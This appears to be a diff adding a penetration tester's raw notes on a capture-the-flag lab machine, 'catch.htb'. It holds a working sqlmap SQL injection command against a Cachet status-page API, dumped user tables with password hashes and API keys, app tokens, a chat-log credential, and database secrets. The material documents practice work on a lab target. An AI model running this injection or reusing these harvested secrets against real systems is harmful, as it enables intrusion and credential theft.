@@ -1,0 +1,99 @@
+https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html
+
+sqlinjection
+
+sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch --level 3 -D cachet --tables
+
+| actions             |
+| cache               |
+| component_groups    |
+| components          |
+| failed_jobs         |
+| incident_components |
+| incident_templates  |
+| incident_updates    |
+| incidents           |
+| invites             |
+| jobs                |
+| meta                |
+| metric_points       |
+| metrics             |
+| migrations          |
+| notifications       |
+| schedule_components |
+| schedules           |
+| sessions            |
+| settings            |
+| subscribers         |
+| subscriptions       |
+| taggables           |
+| tags                |
+| users               |
++---------------------+
+
+id | email           | active | level   | api_key              | password                                                     | username | welcomed | created_at          | updated_at          | remember_token                                               | google_2fa_secret |
++----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+---------------------+---------------------+--------------------------------------------------------------+-------------------+
+| 1  | admin@catch.htb | 1      | 1       | rMSN8kJN9TPADl2cWv8N | $2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om | admin    | 1        | 2022-03-03 02:51:26 | 2022-03-03 02:51:35 | 5t3PCyAurH7oKann9dhMfL7t0ZTN7bz4yiASDB8EAfkAOcN60yx0YTfBBlPj | NULL              |
+| 2  | john@catch.htb  | 1      | 2       | 7GVCqTY5abrox48Nct8j | $2y$10$2jcDURPAEbv2EEKto0ANb.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e | john     | 1        | 2022-03-03 02:51:57 | 2022-03-03 02:52:12 | 5N58LraMhWCeM6kVL1OgADG4DoUkViSmJLowCth6ocSLv9s7DyDmNWgYEJlB | NULL     
+
+
+Table: actions
+[7 entries]
++----+---------+----------+-----------------------------------------------------------+---------------------+---------------------+--------------------+-------------+
+| id | user_id | username | class_name                                                | created_at          | updated_at          | description        | information |
++----+---------+----------+-----------------------------------------------------------+---------------------+---------------------+--------------------+-------------+
+| 1  | 1       | admin    | CachetHQ\\Cachet\\Bus\\Events\\User\\UserLoggedInEvent    | 2022-03-03 02:51:34 | 2022-03-03 02:51:34 | User logged in.    | NULL        |
+| 2  | 1       | admin    | CachetHQ\\Cachet\\Bus\\Events\\User\\UserWasWelcomedEvent | 2022-03-03 02:51:35 | 2022-03-03 02:51:35 | User was welcomed. | NULL        |
+| 3  | 2       | john     | CachetHQ\\Cachet\\Bus\\Events\\User\\UserWasCreatedEvent  | 2022-03-03 02:51:57 | 2022-03-03 02:51:57 | User was created.  | NULL        |
+| 4  | 1       | admin    | CachetHQ\\Cachet\\Bus\\Events\\User\\UserLoggedOutEvent   | 2022-03-03 02:52:02 | 2022-03-03 02:52:02 | User logged out.   | NULL        |
+| 5  | 2       | john     | CachetHQ\\Cachet\\Bus\\Events\\User\\UserLoggedInEvent    | 2022-03-03 02:52:11 | 2022-03-03 02:52:11 | User logged in.    | NULL        |
+| 6  | 2       | john     | CachetHQ\\Cachet\\Bus\\Events\\User\\UserWasWelcomedEvent | 2022-03-03 02:52:12 | 2022-03-03 02:52:12 | User was welcomed. | NULL        |
+| 7  | 2       | john     | CachetHQ\\Cachet\\Bus\\Events\\User\\UserLoggedOutEvent   | 2022-03-03 02:52:21 | 2022-03-03 02:52:21 | User logged out.   | NULL        |
++----+---------+----------+-----------------------------------------------------------+---------------------+---------------------+--------------------+-------------+
+
+use jaxd-gui
+
+<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
+
+<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
+
+<string name="slack_token">xoxp-23984754863-2348975623103</string>
+
+room
+
+[{"id":"61b86b28d984e2451036eb17","slug":"status","name":"Status","description":"Cachet Updates and Maintenance","lastActive":"2021-12-14T10:34:20.749Z","created":"2021-12-14T10:00:08.384Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b8708efe190b466d476bfb","slug":"android_dev","name":"Android Development","description":"Android App Updates, Issues & More","lastActive":"2021-12-14T10:24:21.145Z","created":"2021-12-14T10:23:10.474Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b86b3fd984e2451036eb18","slug":"employees","name":"Employees","description":"New Joinees, Org updates","lastActive":"2021-12-14T10:18:04.710Z","created":"2021-12-14T10:00:31.043Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]}]
+
+account
+
+{"id":"61b86aead984e2451036eb16","firstName":"Administrator","lastName":"NA","username":"admin","displayName":"Admin","avatar":"e2b5310ec47bba317c5f1b5889e96f04","openRooms":["61b86b28d984e2451036eb17","61b86b3fd984e2451036eb18","61b8708efe190b466d476bfb"]}
+
+
+room1 
+
+"text": "ah sure!",
+"text": "You should actually include this task to your list as well as a part of quarterly audit",
+"text": "Also make sure we've our systems, applications and databases up-to-date.",
+"text": "Excellent! ",
+"text": "Why not. We've this in our todo list for next quarter",
+"text": "@john is it possible to add SSL to our status domain to make sure everything is secure ? ",
+"text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
+"text": "Sure one sec.",
+"text": "Can you create an account for me ? ",
+"text": "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me.
+
+room 2
+
+"text": "Thanks @admin ",
+"text": "Please welcome our new IT Admin - Lucas, a crucial role that will help Catch’s revenue and will contribute to the overall profitability of the company!",
+"text": "Thanks John! Glad to be part of the Catch ",
+"text": "Welcome Will!",
+"text": "Join me in welcoming our new employee Will Robinson who's working as iOS Developer with John Team",
+
+room 3
+
+"Hey Team, Just heads up that we're working on android app to alert our customers about status of the services. ",
+
+
+APP_KEY=base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
+${DB_PASSWORD} = s2#4Fg0_%3!
+${DB_USERNAME} = will
